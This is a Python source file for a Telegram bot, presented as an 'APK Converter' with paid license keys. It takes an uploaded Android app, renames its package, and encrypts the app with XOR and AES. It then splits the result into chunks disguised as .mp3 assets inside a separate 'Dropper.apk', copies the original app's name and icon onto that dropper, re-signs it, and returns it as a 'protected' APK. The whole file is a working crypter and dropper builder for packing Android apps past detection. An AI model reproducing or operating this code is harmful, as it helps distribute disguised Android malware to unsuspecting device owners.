import os
import json
import base64
import hashlib
import sqlite3
import datetime
import tempfile
import shutil
import subprocess
import threading
import random
import string
import time
import logging
import re
import asyncio
import gc

from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

processing_semaphore = asyncio.Semaphore(1)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK"

BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN missing!")
else:
    logger.info(f"✅ BOT_TOKEN loaded.")

REQUIRED_GROUP = "@hackdin_red"
GROUP_INVITE_LINK = "https://t.me/hackdin_red"
DAILY_LIMIT = 1
ADMIN_USER_ID = 6593195102

OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="

def xor_data(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def decode_obfuscated(b64_str: str) -> bytes:
    raw = base64.b64decode(b64_str)
    mask = hashlib.sha256("dynamic_key_rotate_monthly".encode()).digest()
    return xor_data(raw, mask)

ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
NUM_PARTS = 15
PREFIX = "part_"
TARGET_PACKAGE = "com.meteah.apl"

DB_PATH = 'db/keys.db'
os.makedirs('db', exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        user_id INTEGER PRIMARY KEY,
        key TEXT,
        expiry_date TEXT,
        last_use_date TEXT,
        use_count INTEGER DEFAULT 0,
        asked_to_join INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()
    logger.info("Database initialized.")

def generate_key(user_id):
    raw = os.urandom(16)
    key = hashlib.sha256(raw).hexdigest()[:16]
    expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT user_id FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    if row:
        c.execute('UPDATE keys SET key=?, expiry_date=? WHERE user_id=?', (key, expiry, user_id))
    else:
        today = datetime.datetime.now().date().isoformat()
        c.execute('INSERT INTO keys (user_id, key, expiry_date, last_use_date, use_count, asked_to_join) VALUES (?, ?, ?, ?, ?, 0)',
                  (user_id, key, expiry, today, 0))
    conn.commit()
    conn.close()
    return key

def validate_key(user_id, key=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    if key:
        c.execute('SELECT expiry_date FROM keys WHERE user_id=? AND key=?', (user_id, key))
    else:
        c.execute('SELECT expiry_date FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return False
    expiry = datetime.datetime.fromisoformat(row[0])
    return expiry > datetime.datetime.now()

def get_user_key(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT key, expiry_date FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    return row if row else None

def check_daily_limit(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT last_use_date, use_count FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    today = datetime.datetime.now().date().isoformat()
    if not row:
        return True
    last_date, count = row
    if last_date == today:
        return count < DAILY_LIMIT
    else:
        return True

def increment_use(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    today = datetime.datetime.now().date().isoformat()
    c.execute('SELECT last_use_date, use_count FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    if row:
        last_date, count = row
        if last_date == today:
            new_count = count + 1
        else:
            new_count = 1
        c.execute('UPDATE keys SET last_use_date=?, use_count=? WHERE user_id=?', (today, new_count, user_id))
    else:
        c.execute('INSERT INTO keys (user_id, last_use_date, use_count) VALUES (?, ?, 1)', (user_id, today))
    conn.commit()
    conn.close()

def has_been_asked_to_join(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT asked_to_join FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def mark_asked_to_join(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('UPDATE keys SET asked_to_join=1 WHERE user_id=?', (user_id,))
    conn.commit()
    conn.close()

def process_encryption(apk_data: bytes, assets_dir: str):
    xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
    iv_bytes = bytes.fromhex(IV_HEX)
    cipher = AES.new(ACTUAL_AES_KEY, AES.MODE_CBC, iv_bytes)
    encrypted_full = cipher.encrypt(pad(xor_step, AES.block_size))
    chunk_size = len(encrypted_full) // NUM_PARTS + 1
    chunks = []
    for i in range(NUM_PARTS):
        start = i * chunk_size
        end = min(start + chunk_size, len(encrypted_full))
        chunks.append(encrypted_full[start:end])
    meta = {
        "build_id": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "timestamp": int(time.time()),
        "total_parts": NUM_PARTS,
        "chunk_size": chunk_size,
        "enc_size": len(encrypted_full),
        "original_size": len(apk_data),
        "original_md5": hashlib.md5(apk_data).hexdigest(),
        "aes_key": OBFUSCATED_AES_KEY_B64,
        "aes_iv": IV_HEX,
        "xor_key": OBFUSCATED_XOR_KEY_B64,
        "entropy_seed": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
        "v3_flag": True
    }
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
        json.dump(meta, f, indent=4)
    for i, chunk in enumerate(chunks):
        with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
            f.write(bytes(chunk))
    return meta

async def sign_apk(apk_path, chat_id, context, keystore_path, password):
    cmd = f"apksigner sign --ks {keystore_path} --ks-pass pass:{password} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {apk_path}"
    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
    if proc.returncode != 0:
        await context.bot.send_message(chat_id, f"❌ Signing failed:\n{proc.stderr[:500]}")
        return False
    return True

async def send_progress(chat_id, text, context, delay=0.2):
    try:
        await context.bot.send_message(chat_id, text)
        await asyncio.sleep(delay)
    except Exception:
        pass

async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    await send_progress(chat_id, "📥 Processing started...", context)
    work_dir = tempfile.mkdtemp()
    try:
        input_apk = os.path.join(work_dir, 'input.apk')
        with open(input_apk, 'wb') as f:
            f.write(apk_data)
        del apk_data

        await send_progress(chat_id, "📖 Decoding user APK...", context)
        decoded_user = os.path.join(work_dir, 'decoded_user')
        proc = subprocess.run(
            f"apktool d -f --no-src -o {decoded_user} {input_apk}",
            shell=True, capture_output=True, text=True, timeout=300
        )
        if proc.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{proc.stderr[:500]}")
            return
        await send_progress(chat_id, "✅ User APK decoded.", context)

        app_name = "App"
        strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
        if os.path.exists(strings_path):
            try:
                import xml.etree.ElementTree as ET
                tree = ET.parse(strings_path)
                root = tree.getroot()
                for string in root.findall('string'):
                    if string.get('name') == 'app_name':
                        app_name = string.text
                        break
            except:
                pass

        icons_temp = os.path.join(work_dir, 'icons')
        os.makedirs(icons_temp, exist_ok=True)
        res_user = os.path.join(decoded_user, 'res')
        if os.path.exists(res_user):
            for root, dirs, files in os.walk(res_user):
                for d in dirs:
                    if d.startswith('drawable') or d.startswith('mipmap'):
                        src = os.path.join(root, d)
                        dst = os.path.join(icons_temp, d)
                        os.makedirs(dst, exist_ok=True)
                        for f in os.listdir(src):
                            if f.endswith('.png'):
                                shutil.copy2(os.path.join(src, f), dst)

        await send_progress(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...", context)
        manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
        if os.path.exists(manifest_path):
            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()
            content = re.sub(r'package="[^"]*"', f'package="{TARGET_PACKAGE}"', content)
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)

        await send_progress(chat_id, "🛠 Rebuilding user APK...", context)
        modified_apk = os.path.join(work_dir, 'modified_user.apk')
        proc = subprocess.run(
            f"apktool b -o {modified_apk} {decoded_user}",
            shell=True, capture_output=True, text=True, timeout=300
        )
        if proc.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Rebuild user APK failed:\n{proc.stderr[:500]}")
            return
        await send_progress(chat_id, "✅ User APK rebuilt.", context)

        await send_progress(chat_id, "🔑 Signing user APK...", context)
        keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
        if not os.path.exists(keystore):
            await context.bot.send_message(chat_id, "❌ Keystore not found!")
            return
        pass_file = os.path.join(os.getcwd(), 'signer', 'keystore_pass.txt')
        if os.path.exists(pass_file):
            with open(pass_file, 'r') as f:
                passwd = f.read().strip()
        else:
            passwd = os.environ.get('KEYSTORE_PASS', '123456')

        if not await sign_apk(modified_apk, chat_id, context, keystore, passwd):
            return
        await send_progress(chat_id, "✅ User APK signed.", context)

        await send_progress(chat_id, "🔐 Encrypting user APK...", context)
        with open(modified_apk, 'rb') as f:
            modified_apk_data = f.read()
        shutil.rmtree(decoded_user, ignore_errors=True)
        gc.collect()

        await send_progress(chat_id, "📖 Decoding Dropper APK...", context)
        dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
        if not os.path.exists(dropper_apk):
            await context.bot.send_message(chat_id, "❌ Dropper.apk not found!")
            return
        decoded_dropper = os.path.join(work_dir, 'decoded_dropper')
        proc = subprocess.run(
            f"apktool d -f --no-src -o {decoded_dropper} {dropper_apk}",
            shell=True, capture_output=True, text=True, timeout=300
        )
        if proc.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{proc.stderr[:500]}")
            return
        await send_progress(chat_id, "✅ Dropper APK decoded.", context)

        await send_progress(chat_id, "📦 Replacing assets...", context)
        assets_dir = os.path.join(decoded_dropper, 'assets')
        process_encryption(modified_apk_data, assets_dir)
        del modified_apk_data
        gc.collect()

        await send_progress(chat_id, "🎨 Copying user icon/name...", context)
        res_dropper = os.path.join(decoded_dropper, 'res')
        if os.path.exists(icons_temp):
            for root, dirs, files in os.walk(icons_temp):
                for d in dirs:
                    src = os.path.join(root, d)
                    dst = os.path.join(res_dropper, d)
                    os.makedirs(dst, exist_ok=True)
                    for f in os.listdir(src):
                        if f.endswith('.png'):
                            shutil.copy2(os.path.join(src, f), dst)
        strings_dst = os.path.join(decoded_dropper, 'res/values/strings.xml')
        if os.path.exists(strings_dst):
            try:
                import xml.etree.ElementTree as ET
                tree = ET.parse(strings_dst)
                root = tree.getroot()
                for string in root.findall('string'):
                    if string.get('name') == 'app_name':
                        string.text = app_name
                        break
                tree.write(strings_dst)
            except:
                pass

        manifest_dropper = os.path.join(decoded_dropper, 'AndroidManifest.xml')
        if os.path.exists(manifest_dropper):
            with open(manifest_dropper, 'r', encoding='utf-8') as f:
                content = f.read()
            if 'android:label="' in content:
                content = re.sub(r'android:label=".*?"', 'android:label="@string/app_name"', content)
            else:
                content = content.replace('<application ', '<application android:label="@string/app_name" ')
            if 'android:icon="' in content:
                content = re.sub(r'android:icon=".*?"', 'android:icon="@drawable/img"', content)
            else:
                content = content.replace('<application ', '<application android:icon="@drawable/img" ')
            with open(manifest_dropper, 'w', encoding='utf-8') as f:
                f.write(content)

        await send_progress(chat_id, "🛠 Rebuilding Dropper APK...", context)
        output_apk = os.path.join(work_dir, 'output.apk')
        proc = subprocess.run(
            f"apktool b -o {output_apk} {decoded_dropper}",
            shell=True, capture_output=True, text=True, timeout=300
        )
        if proc.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Rebuild Dropper failed:\n{proc.stderr[:500]}")
            return
        await send_progress(chat_id, "✅ Dropper APK rebuilt.", context)

        await send_progress(chat_id, "📦 Aligning APK...", context)
        aligned_apk = os.path.join(work_dir, 'aligned.apk')
        try:
            subprocess.run(
                f"zipalign -v -p 4 {output_apk} {aligned_apk}",
                shell=True, check=True, timeout=120
            )
        except Exception as e:
            await context.bot.send_message(chat_id, f"❌ Alignment failed: {str(e)}")
            return
        await send_progress(chat_id, "✅ APK aligned.", context)

        await send_progress(chat_id, "🔑 Signing Dropper APK...", context)
        if not await sign_apk(aligned_apk, chat_id, context, keystore, passwd):
            return
        await send_progress(chat_id, "✅ Dropper APK signed.", context)

        final_apk = aligned_apk

        file_size = os.path.getsize(final_apk)
        file_size_mb = file_size / (1024 * 1024)
        if file_size_mb > 50:
            await context.bot.send_message(
                chat_id,
                f"⚠️ APK size is {file_size_mb:.1f} MB, which exceeds Telegram's 50 MB limit.\n"
                "Please use a smaller APK or compress it."
            )
            return

        await send_progress(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...", context)

        try:
            with open(final_apk, 'rb') as f:
                await context.bot.send_document(
                    chat_id, f, filename="protected_app.apk",
                    read_timeout=600, write_timeout=600
                )
            await context.bot.send_message(chat_id, "✅ Done! Your protected APK is ready.")
        except Exception as e:
            await context.bot.send_message(chat_id, f"❌ Send failed: {str(e)[:200]}")
            logger.error(f"send_document failed: {e}")

        shutil.rmtree(work_dir, ignore_errors=True)
        gc.collect()
        logger.info(f"APK processing complete for user {user_id}")

    except subprocess.TimeoutExpired:
        await context.bot.send_message(chat_id, "❌ Processing timed out. Try again with a smaller APK.")
        shutil.rmtree(work_dir, ignore_errors=True)
        gc.collect()
    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.send_message(chat_id, f"❌ Error: {str(e)[:500]}")
        shutil.rmtree(work_dir, ignore_errors=True)
        gc.collect()

# ----- বট কমান্ড (আগের মতো) -----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📤 Upload APK (Free Daily)", callback_data='upload')],
        [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 APK Converter Bot\n\n"
        f"You can upload **{DAILY_LIMIT} APK per day** for free.\n"
        "If you need more, get a license key from @Red_teem.\n\n"
        f"Join our group (optional): {GROUP_INVITE_LINK}",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    try:
        chat_id = "@" + REQUIRED_GROUP.lstrip("@")
        member = await context.bot.get_chat_member(chat_id, user_id)
        is_member = member.status in ["member", "administrator", "creator"]
    except Exception:
        is_member = False

    if not is_member and not has_been_asked_to_join(user_id):
        await query.message.reply_text(
            f"👋 Welcome! Please consider joining our group: {GROUP_INVITE_LINK}\n"
            "You can still use the bot without joining, but joining helps us grow."
        )
        mark_asked_to_join(user_id)

    if query.data == 'get_key':
        existing = get_user_key(user_id)
        if existing and validate_key(user_id):
            await query.edit_message_text("✅ You already have an active license key.")
            return
        await query.edit_message_text(
            "🔑 Contact @Red_teem for a key.\nUse /activate <key>"
        )
    elif query.data == 'upload':
        if not check_daily_limit(user_id):
            if validate_key(user_id):
                await query.edit_message_text("📤 Send your APK file.")
                return
            else:
                await query.edit_message_text(
                    "❌ You expire free tral limit try tomorrow.\n"
                    "Contact @Red_teem for a license key."
                )
                return
        await query.edit_message_text("📤 Send your APK file.")

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    try:
        chat_id = "@" + REQUIRED_GROUP.lstrip("@")
        member = await context.bot.get_chat_member(chat_id, user_id)
        is_member = member.status in ["member", "administrator", "creator"]
    except Exception:
        is_member = False

    if not is_member and not has_been_asked_to_join(user_id):
        await update.message.reply_text(
            f"👋 Welcome! Please consider joining our group: {GROUP_INVITE_LINK}\n"
            "You can still use the bot without joining."
        )
        mark_asked_to_join(user_id)

    if not check_daily_limit(user_id):
        if not validate_key(user_id):
            await update.message.reply_text(
                "❌ You expire free tral limit try tomorrow.\n"
                "Contact @Red_teem for a license key."
            )
            return

    if not update.message.document or not update.message.document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Please send a valid APK file.")
        return

    await update.message.reply_text("📦 APK received! Processing...")

    try:
        file = await update.message.document.get_file()
        apk_data = await file.download_as_bytearray()
        increment_use(user_id)
        async with processing_semaphore:
            await process_apk_file(update, context, apk_data)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download: {str(e)}")

# ----- অন্যান্য কমান্ড (অপরিবর্তিত) -----
async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /activate <key>")
        return
    user_id = update.effective_user.id
    key = args[0]
    if validate_key(user_id, key):
        await update.message.reply_text("✅ Key activated! You can upload unlimited APKs.")
    else:
        await update.message.reply_text("❌ Invalid key. Contact @Red_teem.")

async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /genkey <user_id>")
        return
    try:
        target_id = int(args[0])
        key = generate_key(target_id)
        await update.message.reply_text(f"✅ Key for user {target_id}: `{key}`")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Main menu\n"
        "/activate <key> - Activate license\n"
        "/genkey <user_id> - (Admin) Generate key\n"
        "/help - This help"
    )

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ----- পরিবর্তিত অংশ (অটো-রিস্টার্ট) -----
def run_bot():
    while True:
        try:
            init_db()
            if not BOT_TOKEN:
                logger.error("BOT_TOKEN missing! Bot will not start.")
                return

            application = (
                Application.builder()
                .token(BOT_TOKEN)
                .read_timeout(600)
                .write_timeout(600)
                .connect_timeout(60)
                .build()
            )
            application.add_handler(CommandHandler("start", start))
            application.add_handler(CommandHandler("help", help_command))
            application.add_handler(CommandHandler("activate", activate))
            application.add_handler(CommandHandler("genkey", genkey_command))
            application.add_handler(CallbackQueryHandler(button_handler))
            application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))

            logger.info("✅ Bot starting polling...")
            application.run_polling(drop_pending_updates=True)
            # যদি এখানে পৌঁছায়, মানে polling থেমে গেছে (যেমন Conflict)
            logger.warning("⚠️ Bot polling stopped unexpectedly. Restarting in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"❌ Bot crashed: {e}. Restarting in 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    run_bot()
